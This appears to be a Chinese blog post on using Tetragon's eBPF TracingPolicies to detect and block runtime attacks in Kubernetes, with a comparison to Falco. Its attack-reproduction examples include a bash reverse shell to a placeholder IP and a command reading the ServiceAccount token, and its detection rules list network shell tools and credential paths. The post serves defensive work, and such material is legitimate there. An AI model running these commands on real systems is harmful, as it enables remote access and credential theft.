---
title: "Tetragon eBPF 运行时安全实战：进程/网络/文件策略、与 Falco 的对比"
date: 2026-04-02T10:00:00+08:00
draft: false
tags: ["eBPF", "Kubernetes", "安全", "Tetragon", "运行时防护", "云原生"]
categories: ["安全"]
description: "用 Tetragon + eBPF 在 Kubernetes 集群里实现进程/网络/文件级别的运行时观测与阻断，包含 TracingPolicy 写法、命名空间过滤、系统调用拦截、与 Falco 的架构与性能对比。"
summary: "Kubernetes 运行时安全是传统 EDR 难以覆盖的盲区。Tetragon 用 eBPF 在内核态采集进程、网络、文件和系统调用事件，并能在内核就地阻断攻击动作。本文从架构原理出发，讲解 TracingPolicy 语法、典型攻击检测（反弹 shell、提权、敏感文件访问）、阻断机制、性能开销，以及它与 Falco 的差异。"
toc: true
math: false
diagram: false
keywords: ["Tetragon", "eBPF", "运行时安全", "Falco", "TracingPolicy", "Kubernetes 安全", "syscall 拦截"]
params:
  reading_time: true
---

## 一、运行时安全：云原生防御体系里最后一道闸

在容器化、Kubernetes 成为事实标准之后，安全团队逐渐形成了一个三层防御模型：

1. **Build time（构建期）**：镜像扫描、依赖 SBOM、Dockerfile 最佳实践检查、签名验证。代表工具是 Trivy、Grype、Syft、cosign。
2. **Admission time（准入期）**：在 Pod 进入集群之前强制执行策略，阻止违规的 workload 创建出来。代表工具是 OPA Gatekeeper、Kyverno。
3. **Runtime（运行时）**：当容器已经跑起来以后，观测它在做什么、检测异常行为、必要时阻断攻击链。这一层就是 Tetragon、Falco 所属的领域。

前两层是**静态**的：它们看的是 manifest 和镜像，看不到“容器启动以后把 /etc/shadow 读走了”这种动态行为。某个应用可能镜像干干净净、Kyverno 规则全过，结果跑起来在容器里反弹 shell、挖矿、连 C2、从 ServiceAccount token 里偷 JWT，传统的漏洞扫描器、EDR 对 Kubernetes 内部基本是盲的。

运行时安全要回答的三个问题：

- **观测**：这个容器正在执行哪些进程？网络连到了哪里？读写了什么文件？
- **检测**：出现的哪些行为组合是异常的？哪些命中了已知的攻击模式？
- **响应**：能不能在攻击动作发生的瞬间就把它挡下来，而不是事后在 SIEM 里发现昨晚已经被拖库了？

能同时把这三件事在 Kubernetes 里做得像样的工具非常少，本文要重点讲的 **Tetragon** 是目前架构最现代的一个。

## 二、Tetragon 是什么

Tetragon 是 Isovalent（Cilium 背后的公司）开源、并已经进入 CNCF sandbox 的运行时安全与可观测项目。它的核心定位是：

> 通过 eBPF 在 Linux 内核态采集进程、网络、文件和系统调用事件，并能就地执行阻断动作，以 Kubernetes 原生方式部署与配置。

几个关键词解释一下：

- **eBPF**：Linux 内核 3.18 起引入、4.x/5.x/6.x 一路增强的可编程内核扩展技术。可以在不修改内核源码、不加载内核模块的前提下，把受限的字节码挂载到 tracepoint、kprobe、uprobe、LSM hook 等点上，性能开销低、稳定性好。
- **内核态采集**：事件不走 `/proc` 轮询，也不依赖用户态 strace，而是直接在 syscall 发生时命中内核 hook。这意味着**攻击者无法通过躲避 auditd 的技巧躲开 Tetragon**，因为 Tetragon 看到的就是内核本身在发生什么。
- **阻断（enforcement）**：Tetragon 不只是观测，它支持在 kprobe 里发 `SIGKILL`，或者直接修改返回值让 syscall 失败。换句话说，恶意进程还没来得及完成动作就被杀掉了。
- **K8s 原生**：策略是 CRD `TracingPolicy` / `TracingPolicyNamespaced`，事件输出里会自动带上 Pod/Namespace/Container/Labels 等 K8s 元信息，集成 kubectl 即可下发。

Tetragon 和 Cilium 共用同一套 eBPF 基础设施，但两者解决的问题不一样：Cilium 关注“谁能连谁”（network policy），Tetragon 关注“在容器内部做了什么”。它们**可以并存**，共享 eBPF，互不冲突。

## 三、架构剖析

Tetragon 的组件拓扑很简单，但每一块都值得单独理解。

### 3.1 组件

- **tetragon agent（DaemonSet）**：每个节点一个 Pod。负责加载 eBPF 程序、读取内核 ring buffer 里的事件、把事件打标、过滤、导出。
- **eBPF programs**：agent 启动时把一组 eBPF 字节码加载到内核，挂到需要的 kprobe/tracepoint/LSM hook 上。这些程序是 Tetragon 的“眼睛和手”。
- **ring buffer**：内核和用户态之间的高性能无锁队列。eBPF 程序在 hook 被触发时把事件压进 ring buffer，agent 用户态读取。
- **export filter**：agent 内部的事件过滤管线，可以按命名空间、Pod 标签、进程名等字段丢弃不关心的事件，降低下游压力。
- **tetragon CLI**：用来 `tetra getevents` 在本机直接看事件流，调试时非常顺手。
- **下游管道**：agent 默认把 JSON 事件写到 stdout 和 `/var/run/cilium/tetragon/tetragon.log`，再通过 Fluent Bit、Vector、Promtail 等 sidecar 或 DaemonSet 送到 Loki/Elasticsearch/OpenSearch。

### 3.2 数据流

```
+---------------------+          +-------------+
|  user process       |          |  attacker   |
|  (inside container) |          |  shell      |
+----------+----------+          +------+------+
           | execve / connect / open      |
           v                              v
+---------------------------------------------------+
|                    Linux kernel                   |
|  kprobe  tracepoint  LSM hook  uprobe             |
|     \        |           |        /               |
|      +-----> eBPF program <-------+                |
|                   |                                |
|                   v                                |
|              ring buffer                           |
+-------------------|--------------------------------+
                    |
                    v
+---------------------------------------------------+
|   Tetragon agent (userspace, per node)            |
|   - K8s enrichment (pod/ns/labels)                |
|   - Export filter                                 |
|   - JSON serialization                            |
+-------------------|--------------------------------+
                    |
                    v
          stdout / file / gRPC
                    |
                    v
             Loki / OpenSearch / SIEM
```

### 3.3 事件模型

Tetragon 的事件是结构化 JSON。最重要的几类：

- `process_exec`：进程启动。包含 binary、参数、cwd、uid/gid、caps、parent exec id。
- `process_exit`：进程退出。与 exec 对齐，可以算出生命周期。
- `process_kprobe`：命中 TracingPolicy 里声明的 kprobe。比如监控 `security_file_open` 时就是这个类型。
- `process_tracepoint`：命中 tracepoint。
- `process_uprobe`：命中用户态函数。

每条事件都带上了 `process.pod.namespace`、`process.pod.name`、`process.pod.container.name`、`process.pod.labels` 等 K8s 字段，可以直接在 Loki 里按命名空间聚合。

## 四、安装部署

生产环境推荐 Helm 安装，版本建议跟随 Tetragon 的 stable 分支。

### 4.1 前置条件

- Linux kernel ≥ 5.4。部分高级特性（override return、LSM BPF）需要 5.7+ 甚至 5.10+。
- 容器运行时：containerd / CRI-O / Docker 都可以。
- CNI：任意。Tetragon 不依赖 Cilium，但和 Cilium 搭配最舒服。
- 权限：agent 需要 `CAP_BPF`、`CAP_PERFMON`、`CAP_SYS_ADMIN`，以及 hostPID、hostNetwork。DaemonSet 默认模板已经写好，不需要手动改。

### 4.2 Helm 安装

```bash
helm repo add cilium https://helm.cilium.io
helm repo update

helm install tetragon cilium/tetragon \
  -n kube-system \
  --set tetragon.enableProcessCred=true \
  --set tetragon.enableProcessNs=true \
  --set tetragon.exportFilename=/var/run/cilium/tetragon/tetragon.log \
  --set tetragon.exportFileMaxSizeMB=50 \
  --set tetragon.exportFileRotationInterval=5m \
  --set tetragon.exportFileMaxBackups=5
```

几个关键开关说明：

- `enableProcessCred`：事件里带上进程的 uid/gid/caps。做提权检测的前提。
- `enableProcessNs`：事件里带上进程所在的 ns（pid/net/mnt/user）。做容器逃逸检测的前提。
- `exportFilename` + 文件轮转参数：让 tetragon 把事件直接写到一个滚动文件里，Promtail/Fluent Bit 再消费。比从 stdout 捞要稳得多，不会被 Docker/containerd 日志驱动截断长行。

### 4.3 与 Cilium / Istio 的关系

- **Cilium**：共用 eBPF 基础设施，各自挂自己的 program，互不冲突。Tetragon 读不到 Cilium 的 policy decision，但通过 connect kprobe 可以看到最原始的网络连接。
- **Istio**：Tetragon 在内核态，Istio sidecar 在用户态，两者观测的是同一条 syscall 的不同视角。Tetragon 看到的是容器内原始进程的 connect；Istio 看到的是经过 envoy 之后的 HTTP 请求。两者结合可以定位到“是哪个业务进程通过 sidecar 发出了某个请求”。

## 五、TracingPolicy CRD 语法

TracingPolicy 是 Tetragon 的核心配置对象。它描述“监控哪些内核 hook、在什么条件下生成事件、是否执行动作”。

### 5.1 基本结构

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: example-policy
spec:
  kprobes:
    - call: "sys_write"
      syscall: true
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "char_buf"
          sizeArgIndex: 3
        - index: 2
          type: "size_t"
      selectors:
        - matchPIDs:
            - operator: NotIn
              followForks: true
              isNamespacePID: true
              values:
                - 0
                - 1
          matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "1"
```

几个要点：

- **call**：要挂的 kprobe 名字。`sys_write`、`security_file_open`、`do_mount` 都可以；哪些可以 attach 取决于内核符号表。
- **syscall: true**：告诉 Tetragon 这是一个 syscall wrapper，需要处理 syscall ABI。
- **args**：按顺序声明每个参数的类型。Tetragon 需要类型来正确地从寄存器/栈里读数据。`char_buf` 这种变长类型还要配 `sizeArgIndex` 指明长度参数的位置。
- **selectors**：过滤器。没有 selector 的 policy 会把每一次调用都报上来，CPU 直接打爆；**生产环境必须写 selector**。
- **matchPIDs / matchArgs / matchActions / matchNamespaces / matchCapabilities**：5 种过滤维度，后面每个案例都会用到。

### 5.2 namespaced vs cluster-wide

Tetragon 有两种 CRD：

- `TracingPolicy`：集群级，作用于所有节点、所有命名空间。
- `TracingPolicyNamespaced`：命名空间级。部署到哪个 ns 就只作用于那个 ns 的 Pod。适合按团队分权。

这两个 CRD 的 spec 结构一样，差别只在作用域。多团队共用集群时，基线 policy 走集群级，业务特异的 policy 走 namespaced。

### 5.3 selector 组合规则

Tetragon 的过滤器是“**同一个 selector 内 AND，不同 selector 之间 OR**”。比如：

```yaml
selectors:
  - matchPIDs: [...]     # selector A
    matchArgs: [...]
  - matchBinaries: [...] # selector B
```

一条事件只要满足 selector A 的所有条件 **或** selector B 的所有条件，就会被上报/动作。理解这个逻辑很关键，很多人写错都是因为以为多 selector 是 AND。

## 六、案例 1：进程执行审计

这是最基础也最常用的场景：审计所有进程 exec，作为后续分析的原始数据。Tetragon 默认就开启了 `process_exec` / `process_exit` 事件，不需要写 TracingPolicy，直接就能在日志里看到。

### 6.1 示例事件

在 `web-cluster` 里随便起一个 busybox Pod：

```bash
kubectl run shell --image=busybox --rm -it -- sh
/ # ls /tmp
/ # cat /etc/hostname
```

在节点上 `tetra getevents -o compact` 可以看到：

```
🚀 process demo/shell /bin/sh
🚀 process demo/shell /bin/ls /tmp
🚀 process demo/shell /bin/cat /etc/hostname
💥 exit    demo/shell /bin/cat /etc/hostname 0
💥 exit    demo/shell /bin/ls /tmp 0
💥 exit    demo/shell /bin/sh 0
```

JSON 原始事件里关心的字段：

```json
{
  "process_exec": {
    "process": {
      "exec_id": "d2VuLWNsdXN0ZXItbm9kZS0xOjEyMzQ1Njc4OTowMDA=",
      "pid": 12345,
      "uid": 0,
      "cwd": "/",
      "binary": "/bin/cat",
      "arguments": "/etc/hostname",
      "parent_exec_id": "...",
      "pod": {
        "namespace": "demo",
        "name": "shell",
        "container": {
          "name": "shell",
          "image": {
            "id": "docker.io/library/busybox@sha256:...",
            "name": "docker.io/library/busybox:latest"
          },
          "start_time": "2026-04-02T09:00:00Z"
        },
        "pod_labels": {
          "run": "shell"
        }
      }
    },
    "parent": { "pid": 12344, "binary": "/bin/sh", "arguments": "" }
  },
  "node_name": "web-cluster-node-1",
  "time": "2026-04-02T09:00:01.123456Z"
}
```

这条事件里最有价值的几个字段，记住它们，后面所有规则都是围绕它们展开的：

| 字段                                     | 含义                   |
| ---------------------------------------- | ---------------------- |
| `process_exec.process.binary`            | 实际执行的可执行文件   |
| `process_exec.process.arguments`         | 完整参数串             |
| `process_exec.process.uid`               | 进程 uid（看提权）     |
| `process_exec.process.pod.namespace`    | K8s namespace          |
| `process_exec.process.pod.container.image.name` | 容器镜像        |
| `process_exec.parent.binary`             | 父进程二进制           |
| `process_exec.process.cap.permitted`     | 能力集（caps）         |

### 6.2 Loki 查询示例

假设事件已经通过 Promtail 打到 Loki，label 是 `app="tetragon"`，可以直接用 LogQL 找出所有 root 执行 `curl` 的行为：

```
{app="tetragon"}
| json
| process_exec_process_uid = "0"
| process_exec_process_binary = "/usr/bin/curl"
| line_format "{{.process_exec_process_pod_namespace}}/{{.process_exec_process_pod_name}} curl {{.process_exec_process_arguments}}"
```

## 七、案例 2：反弹 shell 检测

反弹 shell 是云上最常见的攻击成功标志之一。典型手法是在容器里跑 `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`，把 shell 的标准输入输出通过 TCP 连到攻击者机器。

这类行为很容易被描述成一个规则：**由交互式 shell 触发的 connect 到非本集群的 IP**。Tetragon 的做法是在 `tcp_connect` 上挂 kprobe，然后用 `matchBinaries` 过滤出 shell。

### 7.1 TracingPolicy

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-reverse-shell
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/bin/bash"
                - "/usr/bin/bash"
                - "/bin/sh"
                - "/usr/bin/sh"
                - "/bin/dash"
                - "/usr/bin/zsh"
                - "/usr/bin/nc"
                - "/usr/bin/ncat"
                - "/usr/bin/socat"
          matchArgs:
            - index: 0
              operator: "NotDAddr"
              values:
                - "127.0.0.1"
                - "10.0.0.0/8"
                - "172.16.0.0/12"
                - "192.168.0.0/16"
```

几个要点：

1. `tcp_connect` 是 kprobe 而不是 syscall，`syscall: false` 必须写。
2. `matchBinaries` 直接在内核态用路径前缀匹配，避免把事件都上报到用户态再过滤。
3. `NotDAddr` + 私有网段集合，意思是“目的 IP 不是集群内部和私有网络”。真实环境要把 Pod CIDR、Service CIDR 也写进来，避免误报业务 Pod 内部互联。
4. 这条 policy 只上报，不阻断，见下文 enforcement 再加动作。

### 7.2 攻击复现与事件

在一个 Pod 里跑反弹 shell：

```bash
kubectl exec -it demo/shell -- bash -c \
  'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'
```

假设 `203.0.113.10` 是公网攻击机。事件中对应的 `process_kprobe`：

```json
{
  "process_kprobe": {
    "process": {
      "binary": "/bin/bash",
      "arguments": "-i",
      "pod": {
        "namespace": "demo",
        "name": "shell"
      }
    },
    "function_name": "tcp_connect",
    "args": [
      {
        "sock_arg": {
          "family": "AF_INET",
          "saddr": "10.0.1.23",
          "sport": 54321,
          "daddr": "203.0.113.10",
          "dport": 4444,
          "protocol": "IPPROTO_TCP"
        }
      }
    ],
    "action": "KPROBE_ACTION_POST"
  }
}
```

### 7.3 在 SIEM 里形成告警规则

把这条事件导到 Elasticsearch/OpenSearch 后，用一条 DSL 聚合就是一条高置信度告警：

```json
{
  "query": {
    "bool": {
      "must": [
        { "term": { "process_kprobe.function_name": "tcp_connect" } },
        { "terms": { "process_kprobe.process.binary": [
          "/bin/bash","/usr/bin/bash","/bin/sh","/usr/bin/sh","/usr/bin/ncat","/usr/bin/socat"
        ] } }
      ],
      "must_not": [
        { "terms": { "process_kprobe.args.sock_arg.daddr": [
          "10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","127.0.0.0/8"
        ] } }
      ]
    }
  }
}
```

实战里反弹 shell 检测的假阳率非常低，因为生产业务容器里理论上不应该有 shell 做 outbound connect。

## 八、案例 3：敏感文件访问检测

典型的敏感文件：

- `/etc/shadow`：密码哈希，容器里不该有，但常见被挖矿脚本当作“主机是否暴露”的探测目标。
- `/var/run/secrets/kubernetes.io/serviceaccount/token`：Pod 的 ServiceAccount token。正常业务通过 in-cluster client 读，一旦非 client-go/informer 的进程去读，就很可疑。
- `/root/.ssh/id_rsa`：SSH 密钥。
- `/var/lib/kubelet/pods/*/volumes/.../token`：kubelet 视角下的 SA token。
- `/etc/kubernetes/admin.conf`：master 节点上的 admin kubeconfig。

### 8.1 TracingPolicy

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-sensitive-file-access
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      return: true
      args:
        - index: 0
          type: "file"
      returnArg:
        index: 0
        type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/gshadow"
                - "/root/.ssh/"
                - "/var/run/secrets/kubernetes.io/serviceaccount/"
                - "/var/lib/kubelet/pods/"
                - "/etc/kubernetes/admin.conf"
          matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/bin/kubelet"
                - "/usr/local/bin/kubelet"
                - "/usr/bin/containerd"
                - "/usr/bin/runc"
```

要点：

1. 挂的是 **LSM hook `security_file_open`**，而不是 `open` syscall。原因是 LSM hook 参数里是已经解析好的 `struct file *`，Tetragon 可以直接拿到完整路径；而 `open` syscall 的第一个参数只是用户态的 char\*，路径相对路径时很难还原。
2. `matchBinaries` 用 `NotIn` 把 kubelet、containerd、runc 这些“合法访问者”排除。`/var/lib/kubelet/pods/` 路径本来就是 kubelet 每秒都要访问的热路径，不排除的话事件量巨大。
3. 这个 policy **只在进程命中 prefix 时才上报**。一个生产集群每分钟这种事件应该只有个位数，出现了就要立即排查。

### 8.2 攻击复现

攻击者进入容器后执行：

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

事件：

```json
{
  "process_kprobe": {
    "process": {
      "binary": "/bin/cat",
      "arguments": "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "pod": { "namespace": "demo", "name": "shell" },
      "uid": 0
    },
    "function_name": "security_file_open",
    "args": [
      {
        "file_arg": {
          "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
          "flags": "O_RDONLY",
          "permission": "-rw-r--r--"
        }
      }
    ]
  }
}
```

与 `/bin/cat` 组合出现的就是极高置信度的告警。合法业务理论上不会用 `cat` 去读 SA token，都是通过 client-go 的 REST client loader 读。

## 九、案例 4：容器逃逸信号

容器逃逸的前奏动作在内核视角下很有特征：

- `setns()`：切换进程的命名空间。`runc exec` 会用到；但容器内部进程不应该主动调用 setns。
- `pivot_root()`：改变 mount ns 的根。容器启动时 runc 会用，启动完成后不该出现。
- 访问 `/proc/self/exe` 并执行它：CVE-2019-5736 runc 逃逸的关键路径。
- 访问 `/proc/1/root/...`：通过 host init 的 mount 反向访问宿主机路径。

### 9.1 TracingPolicy

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-container-escape
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      args:
        - index: 0
          type: "file"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/proc/self/exe"
                - "/proc/1/root/"
                - "/proc/1/cgroup"
          matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/bin/runc"
                - "/usr/bin/containerd-shim-runc-v2"
    - call: "__x64_sys_setns"
      syscall: true
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "int"
      selectors:
        - matchNamespaces:
            - namespace: "Pid"
              operator: "NotIn"
              values:
                - "host_ns"
    - call: "__x64_sys_pivot_root"
      syscall: true
      args:
        - index: 0
          type: "string"
        - index: 1
          type: "string"
```

注意：

- kprobe 的函数名在不同架构/内核版本会带不同前缀（`__x64_sys_*`、`__arm64_sys_*`），部署前先 `cat /proc/kallsyms | grep sys_setns` 确认。
- `matchNamespaces` 过滤掉宿主机自身 ns，避免把节点上的 crio/containerd 的正常动作当成告警。

### 9.2 与 Kyverno 的分工

Kyverno 应该禁止 `hostPID: true`、`privileged: true`、`CAP_SYS_ADMIN` 的 Pod 进入集群；Tetragon 则负责**万一还是有特权 Pod 跑起来**后的兜底检测。这两者一个是准入、一个是运行时，必须都要有。

## 十、案例 5：提权检测

### 10.1 setuid

一个非 root 进程通过 setuid(0) 提权是最经典的信号。大部分业务不会这么干，出现了基本就是 exploit。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-privilege-escalation
spec:
  kprobes:
    - call: "__x64_sys_setuid"
      syscall: true
      args:
        - index: 0
          type: "int"
      selectors:
        - matchPIDs:
            - operator: NotIn
              followForks: true
              isNamespacePID: true
              values:
                - 0
                - 1
          matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "0"
    - call: "__x64_sys_setgid"
      syscall: true
      args:
        - index: 0
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "0"
```

### 10.2 capset

`capset` 是 Linux capabilities 的修改入口。攻击者拿到 shell 后常常尝试通过 capset 加回 `CAP_SYS_ADMIN`、`CAP_NET_ADMIN` 等。监控它会产生很多噪音（容器启动时 runc 会合法调用），配合 `matchBinaries` 排除即可：

```yaml
- call: "__x64_sys_capset"
  syscall: true
  args:
    - index: 0
      type: "user_cap_header"
    - index: 1
      type: "user_cap_data"
  selectors:
    - matchBinaries:
        - operator: "NotIn"
          values:
            - "/usr/bin/runc"
            - "/usr/bin/containerd-shim-runc-v2"
            - "/usr/bin/crun"
```

### 10.3 与 execve 事件关联

Tetragon 在每条 `process_exec` 事件里都会带上 `process.cap.permitted`、`process.cap.effective`、`process.cap.inheritable`，可以在 Loki 里直接用 LogQL 算出“新生成的 root 进程”的数量趋势，作为异常指标：

```
sum(rate({app="tetragon"}
  | json
  | process_exec_process_uid = "0"
  | process_exec_parent_uid != "0"
[5m]))
by (process_exec_process_pod_namespace)
```

这条公式表示“由非 root 父进程 fork 出来的 root 子进程速率”，正常集群应该接近 0。

## 十一、案例 6：网络策略可观测化

Cilium 的 network policy 只告诉你“是否允许连接”，Tetragon 可以告诉你“实际在哪发生了连接”。两者结合，能回答“这条 deny 是哪个进程触发的”这种问题。

### 11.1 TracingPolicy

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: observe-outbound-connect
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchNamespaces:
            - namespace: "Pid"
              operator: "NotIn"
              values:
                - "host_ns"
          matchArgs:
            - index: 0
              operator: "NotDAddr"
              values:
                - "127.0.0.0/8"
                - "10.0.0.0/8"
                - "172.16.0.0/12"
                - "192.168.0.0/16"
```

### 11.2 用法

这条 policy 会报出所有 Pod 里发起的“非内网 connect”。用来：

- 发现未经声明的第三方依赖（哪个服务偷偷 call 了某个 SaaS）
- 排查 egress network policy 为什么拒绝某个请求
- 在成本治理场景下发现谁在往 S3/OSS 写大量数据

## 十二、阻断能力（enforcement）

观测只是第一步，Tetragon 的杀手锏是**在事件发生的瞬间在内核阻断**。做法有两种：

### 12.1 Sigkill

在 selector 里加 `matchActions: [{action: Sigkill}]`，命中条件时 eBPF 程序会给触发进程发 `SIGKILL`。对应到反弹 shell 的例子：

```yaml
selectors:
  - matchBinaries:
      - operator: "In"
        values: ["/bin/bash", "/bin/sh"]
    matchArgs:
      - index: 0
        operator: "NotDAddr"
        values: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
    matchActions:
      - action: Sigkill
```

一旦容器里的 bash 去 connect 非内网 IP，这个 bash 进程被内核当场 KILL，攻击者的 shell 直接断开。

### 12.2 Override return

对某些 syscall，不想 kill 进程，只想让这次 syscall 失败。比如对 `openat` 敏感路径返回 `-EPERM`：

```yaml
- call: "__x64_sys_openat"
  syscall: true
  return: true
  args:
    - index: 1
      type: "string"
  returnArg:
    index: 0
    type: "int"
  selectors:
    - matchArgs:
        - index: 1
          operator: "Prefix"
          values:
            - "/etc/shadow"
      matchActions:
        - action: Override
          argError: -1
```

业务侧会看到 open 失败，进程不会被杀掉，适合那些“想要尽量保持可用性但不能让文件被读出去”的场景。

### 12.3 enforcement 的边界

- **内核版本**：Override return 依赖 `bpf_override_return`，要求内核编译时开启 `CONFIG_BPF_KPROBE_OVERRIDE=y`。大部分发行版默认没开，需要自己验证。
- **TOCTOU**：Sigkill 在 kprobe 里发的时候，系统调用已经进入内核；对 open 这种能在返回前 kill 的可以拦得住，对一些异步 syscall 可能拦不住。
- **误杀**：规则写错后果比 Falco 严重得多，因为 Falco 最多告警，Tetragon 直接 kill。**enforcement policy 必须先用 `report-only` 模式跑一周以上再开启 Sigkill**。

## 十三、事件导出管道

Tetragon agent 把 JSON 事件写到本地文件后，下游怎么接是一个单独的问题。

### 13.1 文件格式

默认是 newline-delimited JSON（NDJSON），一行一条事件。轮转由 agent 自己做，不依赖 logrotate。重要参数：

- `exportFilename`：完整路径。
- `exportFileMaxSizeMB`：单文件最大，到达阈值切新文件。
- `exportFileMaxBackups`：保留多少个历史文件。
- `exportFileRotationInterval`：强制时间轮转。
- `exportFileCompress`：轮转后是否 gzip 压缩，节省磁盘。

生产环境推荐设置：`exportFileMaxSizeMB=100`、`exportFileMaxBackups=10`、`exportFileRotationInterval=1h`、`exportFileCompress=true`。这样每个节点最多占 1GB 左右。

### 13.2 Promtail → Loki

```yaml
scrape_configs:
  - job_name: tetragon
    static_configs:
      - targets: [localhost]
        labels:
          job: tetragon
          __path__: /var/run/cilium/tetragon/tetragon.log*
    pipeline_stages:
      - json:
          expressions:
            namespace: process_exec.process.pod.namespace
            pod: process_exec.process.pod.name
            container: process_exec.process.pod.container.name
            binary: process_exec.process.binary
      - labels:
          namespace:
          pod:
      - timestamp:
          source: time
          format: RFC3339Nano
```

注意 **label 不要把 `binary` 直接放进去**，否则 cardinality 爆炸。Binary 应该留在 log line 里，查询时用 LogQL 的 `json` stage 解析。

### 13.3 Fluent Bit → OpenSearch

```
[INPUT]
    Name        tail
    Path        /var/run/cilium/tetragon/tetragon.log*
    Parser      json
    Tag         tetragon.*
    Refresh_Interval 5

[FILTER]
    Name        modify
    Match       tetragon.*
    Add         source tetragon

[OUTPUT]
    Name        opensearch
    Match       tetragon.*
    Host        opensearch.example.com
    Port        9200
    Index       tetragon
    Type        _doc
    Logstash_Format On
    Logstash_Prefix tetragon
    Suppress_Type_Name On
```

OpenSearch 端建议：

- 按天 rollover，保留 30~90 天。
- index template 里把 `process_exec.process.pod.namespace`、`process_exec.process.binary`、`process_kprobe.function_name` 标为 keyword。
- 给 `process_kprobe.args` 做 nested mapping，否则数组字段过滤会踩坑。

## 十四、性能开销

eBPF 性能很好，但也不是零开销。几个实践经验：

### 14.1 影响 CPU 的三个变量

1. **hook 点的调用频率**：`tcp_connect` 每秒几百次没问题；`sys_write` 每秒几十万次，全量挂上去节点直接炸。选 hook 时要先 `perf stat` 看频次。
2. **selector 是否下沉到内核**：matchBinaries、matchPIDs、matchNamespaces、matchArgs 都是在 eBPF 程序里执行的，不会把事件压到 ring buffer。用户态过滤（export filter）要比内核过滤贵一个数量级。
3. **字段解析的代价**：`char_buf` 要从用户态内存里 copy，比纯整数字段贵很多。能不读就不读。

### 14.2 ring buffer 大小

Tetragon 默认 per-CPU ring buffer 8MB。事件突发时如果用户态消费不过来会丢事件（dropped），有专门 metric 可以看：

```
tetragon_ringbuf_events_lost_total
```

在 8 核机器上跑全量 `security_file_open` 观测，高峰期我见过每分钟丢几万条。解决办法是：

- 增大 ring buffer（Helm values 里配）
- 加 selector 让事件量降下来
- agent 资源 limit 放宽，别被 cgroup CPU throttle

### 14.3 实测数据范围

从 Isovalent 官方博客和社区公开的 benchmark：

- 空 policy，只开 process_exec：节点 CPU 额外 0.5~1%
- 30 条典型 policy（进程 + 网络 + 敏感文件）：节点 CPU 额外 2~4%
- 开启 Sigkill enforcement 后对受害进程延迟 <1ms

这些数据只是参考，生产落地时一定要在自己的负载上跑基线测试，不要直接信任公开数字。

## 十五、Tetragon vs Falco

这是最多人问的问题。逐维度对比。

### 15.1 架构

- **Falco**：历史上用过内核模块（kmod）和 eBPF probe 两种后端。现在主推 modern-bpf（CO-RE），但和 Tetragon 的 eBPF 写法不同——Falco 的 eBPF 程序更多是用来把 syscall 上下文搬到用户态，真正的规则引擎在用户态。
- **Tetragon**：规则求值尽量下沉到内核 eBPF 程序本身，selector 在内核匹配。这意味着 Tetragon 可以做内核态阻断，而 Falco 要阻断只能靠用户态 response，慢得多。

### 15.2 规则语言

- **Falco**：自研 DSL，基于 `macro` + `list` + `rule`。表达力非常强，可以写出很复杂的条件组合，语法像 Splunk SPL。
- **Tetragon**：YAML + CRD。语法结构简单直接，缺点是表达力不如 Falco DSL 丰富，想写复杂逻辑常常要拆成多条 policy。

**结论**：Falco 规则语言更灵活，Tetragon 规则语言更贴近 K8s 原生习惯。团队有 DSL 学习成本承受力选 Falco，想直接走 GitOps + kubectl apply 选 Tetragon。

### 15.3 性能

- Falco 因为规则在用户态，事件要先序列化过 ring buffer 到用户态再匹配，CPU 开销一般比 Tetragon 高。
- Tetragon 的 selector 下沉到内核，能挡住 90% 的事件，实际送到用户态的流量低一个数量级。

**结论**：同等规则下 Tetragon CPU 占用更低，尤其在高频 hook 场景。

### 15.4 阻断能力

- Falco：官方定位是“检测”，阻断靠 falco-response（sidecar）在用户态执行，等同于事后发 SIGKILL 或 network policy 调整，存在明显延迟。
- Tetragon：内核态 Sigkill / override return，攻击动作本身的 syscall 就被拦。

**结论**：Tetragon 阻断能力显著优于 Falco。

### 15.5 K8s 原生度

- Falco：K8s 支持完善（Falcosidekick），但规则管理仍是配置文件。
- Tetragon：规则是 CRD，原生 kubectl/GitOps 友好，命名空间级权限天然分得开。

**结论**：Tetragon 更 K8s 原生。

### 15.6 生态和社区

- Falco：CNCF Incubating（更成熟），社区规则库（falco-rules）非常丰富，sysdig 商业版有大量场景覆盖。
- Tetragon：CNCF Sandbox（较新），规则库正在快速成长，但离 Falco 的社区积累还有距离。

**结论**：规则开箱即用体验 Falco 更好，Tetragon 需要自己写更多 policy。

### 15.7 选型建议

| 场景 | 建议 |
| --- | --- |
| 想要开箱即用、规则生态最丰富 | Falco |
| 需要内核态阻断、追求低开销 | Tetragon |
| 已经用 Cilium，想复用 eBPF | Tetragon |
| 只需要日志式告警、不阻断 | Falco 足够 |
| 想做 K8s 原生 GitOps 策略管理 | Tetragon |
| 两者都上？ | 可以。Falco 做检测规则库，Tetragon 做关键路径阻断 |

